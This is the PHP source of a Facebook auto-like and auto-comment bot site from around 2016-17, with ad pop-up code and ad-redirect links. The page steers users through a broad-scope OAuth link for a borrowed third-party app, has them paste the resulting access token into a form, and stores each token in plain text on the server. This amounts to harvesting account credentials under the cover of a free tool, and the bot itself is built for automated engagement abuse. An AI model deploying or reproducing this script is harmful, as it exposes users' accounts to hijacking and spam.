<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
♥[̲̅g̲̅][̲̅a̲̅][̲̅n̲̅][̲̅g̲̅][̲̅s̲̅][̲̅t̲̅][̲̅a̲̅][̲̅r̲̅] [̲̅b̲̅][̲̅o̲̅][̲̅t̲̅] [̲̅t̲̅][̲̅e̲̅][̲̅a̲̅][̲̅m̲̅]♥
</title>
<link rel="stylesheet" type="text/css" href="msbot.css" media="all,handheld"/>
<link rel="shortcut icon" a href="https://www.facebookbrand.com/img/fb-art.jpg">


<script type=text/javascript>
 var _cpp= _cpp || [];
  _cpp['username']    = "HUSNAIN";
  _cpp['pop_type']    = "2";
  _cpp['onePer']    = "0";
  _cpp['freq']        = "20";   
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src =
var cs = document.getElementsByTagName('script')[0];
cs.parentNode.insertBefore(hs, cs);
})();</script>
<!--- END OF CPX24 CODE --->
<?php
error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $cokis[]=$b.'='.$c;
}
$true='?'.implode('&',$cokis);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'DESCRIPTION BY pakfun.heck.in',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
if(!is_dir('cokis')){
        mkdir('cokis');
}
if($bb){
$blue=fopen('cokis/'.$id,'w');
fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
        fclose($blue);

echo'<script type="text/javascript">alert("INFO : Your Written Comment Has Been Saved !! Good Luck !!")</script>';
}else{
        if($z){
if(file_exists('cokis/'.$id)){
$file=file_get_contents('cokis/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('cokis/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
$xs=fopen('cokis/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('cokis/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('cokis/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('cokis/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
        fclose($up);
        }
echo'<script type="text/javascript">alert("INFO : Script Comment Has Been Saved !! Good Luck !! MSaleem")</script>';}}
}

public function lOgbot($d){
        unlink('cokis/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
$if=file_get_contents('cokis/'.$id);
$if=explode('*',$if);
if(preg_match('/on/',$if[1])){
        $satu='on';
        $ak='Like tambah komen';
}else{
        $satu='off';
        $ak='Like saja';
}
if(preg_match('/on/',$if[2])){
        $dua='on';
        $ik='Bot emo';
}else{
        $dua='off';
        $ik='Bot manual';
}
if(preg_match('/on/',$if[3])){
        $tiga='on';
        $ek='Powered on';
}else{
        $tiga='off';
        $ek='Powered off';
}
if(preg_match('/on/',$if[4])){
        $empat='on';
        $uk='Text via script';
}else{
        $empat='off';
        $uk='Via text sendiri';
}
echo'
<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link">GᗩᑎGᔕTᗩᖇ ᗷOT TEᗩᗰ™</a></h3>
<ul>
<li>
Welcome Back : <font color="red">'.$nm.'</font></li>
<li>
<a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;" alt="'.$nm.'"/></a></li>
<li>
<form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
<input type="submit" value="Logout Bot"></form></li>
<li>
<form action="index.php" method="post">
Select Menu Robot</li>
<li>
<select name="likes">';
        if($satu=='on'){
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="off">
Like saja</option>
</select>';
        }else{
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="on">
Like tambah komen</option>
</select>';
}
echo'</li>
<li>
<select name="emot">';
        if($dua=='on'){
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="off">
Bot manual</option>
</select>';
        }else{
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="on">
Bot emo</option>
</select>';
}
echo'</li>
<li>
<select name="target">';
        if($tiga=='on'){
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="off">
Powered off</option>
</select>';
        }else{
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="on">
Powered on</option>
</select>';
}
echo'</li>
<li>';
        if($empat=='on'){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="off">
Via text sendiri</option>
</select>';
}else{
        if($if[5]){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="text">
Ganti Text Anda
</option>
<option value="on">
Text via script</option>
</select>';
        }else{
        echo'
Buat text Anda
<br>
<input type="text" name="text" style="height:30px;">
<input type="hidden" name="opsi" value="'.$empat.'">';}
}
echo'
</li>
</ul></div>

<div id="top-content">
<div id="search-form">
<input type="submit" value="SAVE"></form>
</div></div></div>';

$this->membEr();
}

public function atas(){
$hari=array(1=>
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday",
        "Sunday"
);

$bulan=array(1=>
"January",
  "February",
    "March",
     "April",
       "May",
         "June",
           "July",
             "August",
               "September",
          "October",
     "November",
"Desember"
);

$hr=$hari[gmdate('N',time()+60*60*7)];
$tgl=gmdate('j',time()+60*60*7);
$bln=
$bulan[gmdate('n',time()+60*60
*7)];
$thn=gmdate('Y',time()+60*60*7);
$jam=gmdate('H',time()+60*60*7);

echo'
<center>

<div id="header">
<h1 class="heading">
<center><img src="techimg.gif"/></center>
</h1>
<h2 class="description">
'.$hr.' : '.$tgl.' - '.$bln.' - '.$thn.'<br>
'.$jam.'</h2></center></div>';
}
public function home(){
echo'

<div id="content">
<div class="post">
<div class="post-meta">
<h2 class="title">
Administrator Websites
</h2>
By <font color="red">GᗩᑎGᔕTᗩᖇ ᗷOT TEᗩᗰ™</font>
</div>

<div class="post-content">
<a href="http://m.facebook.com/100013008406807"><img src="https://graph.facebook.com/100013008406807/picture" style="border: 2px solid #000; padding: 2px; margin: 2px; width: 50px; height: 50px; float: left;" alt="MSaleem" class="thumbnail"/></a>
<span>
<br>
Roɓot Cʀɘʌtɘɗ Bƴ:<b><a href="http://fb.com/100013008406807"><font color="red">♥Mʋʜʌɱɱʌɗ HʋSŋʌɩŋ
 ♥</font></a></b>
<br>
How To Mʌĸɘ Yoʋʀ Owŋ Pɘʀsoŋʌɭ Bot : <a href="http://wap4dollar.com/ad/serve.php?id=m29jwhfy53"><font color="green">Cɭɩcĸ Hɘʀɘ</font></a><br>
Dowŋɭoʌɗ Scʀɩpt <a href="http://wap4dollar.com/ad/serve.php?id=m29jwhfy53"><font color="yellow">♥Cɭɩcĸ Hɘʀɘ♥</font></a><br>

</span>
</div>

<div class="post-meta2">
<center><iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fmuhammadhusnain01&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe></center>

</div></div></div>
';
}

public function bwh(){
echo'
<div id="bottom-content">
<div id="navigation-menu">
</head>
    <body>
        <div id="main">
            <div id="content">
                <div class="header">
<span class="mfss fcg">
<center>
<h2><font size="15" color="green"></font><font face="Orbitron" size="7" style="background: url(&quot;http://i1314.photobucket.com/albums/t576/vophuongdong/nabz_zpse21a729c.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em blue, 0pt 2pt 0.6em blue;"><b>—(••÷[ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]÷••—</b></font><font size="15" color="white">❤</font></h2>
</center>
<marquee behavior="scroll" direction="right" scrollamount="5" scrolldelay="3" width="100%">
<b>
(<font size="9" color="red">♥</font><a class="sec" href="http://fb.com/100013008406807"><font color="black" size="9">♥GᗩᑎGᔕTᗩᖇ ᗷOT TEᗩᗰ™</font></a></b> <font size="9" color="red">♥</font>)</marquee><br />
<marquee behavior="scroll" direction="left" scrollamount="5" scrolldelay="3" width="100%">
<b>
<font size="7" color="red">(</font><a class="sec" href="http://wap4dollar.com/ad/serve.php?id=m29jwhfy53"><font color="red" size="7">HOW TO MAKE YOUR PERSONAL BOT COMPLETE TUTURIAL CLICK HERE</font></a></b><font size="7" color="red">)</font></marquee><br />
</span>
</div>
<div style="border-top: 1px #ff0066 solid; margin-top: 8px;"></div></br>
<h3><a name="navigation-name" class="no-link"><font color="pink"size="5"><i>GANGSTAR BOT TEAM</font></a></h3>

<ul>
<li><a target="_blank" href="https://www.facebook.com/v1.0/dialog/oauth?redirect_uri=https%3A%2F%2Fwww.htcsense.com%2Fauth%2Ffacebook%2Fcallbacks?-------------------%3ECOPY_THE_TOKEN-----%3E&scope=user_videos,friends_photos,friends_videos,publish_actions,user_photos,friends_photos,user_activities,user_likes,user_status,friends_status,publish_stream,read_stream,status_update&response_type=token&client_id=41158896424&_rdr"><font color="green">➲ </font>Allow Apps To Install HTC Token</a></li>
<li><a target="_blank" href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424"><font color="green">➲ </font> Get Token Debugger</a>
</li>
<li><font color="pink"size="4"><i><font color="green">➫ </font>IF BOT NOT Working Then Contact Me On Facebook <a href="http://fb.com/muhammadhusnain01">♥Mʋʜʌɱɱʌɗ HʋSŋʌɩŋ♥</a></font></li>
</ul></div>

<div style="border-top: 1px #ff0066 solid; margin-top: 10px;"></div></br>
<center><font color="sky blue" size="5">Please Submit Your Access Token Here</font></center>

<div id="top-content">
<div id="search-form">

<form action="index.php" method="post"><input class="inp-text" type="text" style="height:28px;" name="token"> <input class="inp-btn" type="submit" style="height:28px;" value=" SUBMIT"></form></div></div></div>';
$this->membEr();
}
public function membEr(){
if(!is_dir('cokis')){
mkdir('cokis');
}
$up=opendir('cokis');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
$user[]=$use;}
}

echo'
<div align=center>
<a href="http://pakfun.heck.in" target="_blank" ><img src="moresites.jpg"/></a?
</div>
<div id="footer">
User robot : <font color="red">'.count($user).'</font>
<br>
Script Bot &copy; 2016-17<br>
Powered by :<font color="red"><a target="_blank" href="pakfun.heck.in">PAKFUN™</a></font><br>
Script Modified By : <a target="_blank" href="http://www.facebook.com/muhammadhusnain01">♥Mʋʜʌɱɱʌɗ HʋSŋʌɩŋ</a>
</div>';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
$a=$_SESSION[key];
$ai=explode('_',$a);
$a=$ai[0];
if($_POST[logout]){
$ax=$_POST[logout];
$bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
$as=$_POST[likes];
$bs=$_POST[emot];
$bx=$_POST[target];
$cs=$_POST[opsi];
$tx=$_POST[text];
if($cs=='text'){
unlink('cokis/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
}else{
if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
}else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
$bot->atas();
$bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
unset($_SESSION[key]);
unlink('cokis/'.$ai[1]);
$bot->atas();
$bot->home();
$bot->bwh();}}
}else{
if($_POST[token]){
$a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
}else{
$cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
$bot->atas();
$bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Token invalid")</script>';
$bot->atas();
$bot->home();
$bot->bwh();}
}else{
if($_GET[token]){
$a=$_GET[token];
$bot->toXen($a);
}else{
$bot->atas();
$bot->home();
$bot->bwh();}}
}
?>